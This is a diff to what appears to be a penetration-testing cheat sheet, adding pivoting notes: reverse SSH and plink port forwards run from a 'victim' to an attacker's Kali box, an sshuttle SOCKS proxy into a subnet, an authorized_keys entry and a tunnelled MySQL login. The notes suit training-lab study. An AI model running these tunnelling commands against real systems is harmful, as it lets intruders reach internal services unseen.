@@ -2280,11 +2280,26 @@ Run in victim (5985 WinRM):
 
 `plink.exe -l kali -pw P@$$word -R 8080:127.0.0.1:445 10.10.16.155`
 
-`ssh -l kali -pw P@$$word -R 445:127.0.0.1:445 10.10.16.155`
+`ssh -l kali -pw P@$$word -R 445:127.0.0.1:445 10.10.16.155` #port forward
 
 ## Linux
 
-sudo sshuttle -r sean@10.11.1.251 10.1.1.0/24 -v ## Requires PW of user; Socks Proxy to entire subnetwork from kali
+#Socks Proxy
+
+`sudo sshuttle -r sean@10.11.1.251 10.1.1.0/24 -v` ## Requires PW of user; Socks Proxy to entire subnetwork from kali
+
+#Remote Port Forward:
+
+`ssh-keygen` # From victim machine; create keys to allow ssh connection
+
+`from="10.11.1.250",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa ssh-rsa <id_rsa.pub result>`  #Placed in kali known_hosts/authorized_keys file
+
+`ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/thunda/id_rsa kali@192.168.119.209`  #CMD ran in victim for port fwd
+
+`mysql --host=127.0.0.1 --port=13306 --user=wp -p`  #Connection using port forward
+
+
+
 
 # **Active Directory**
 
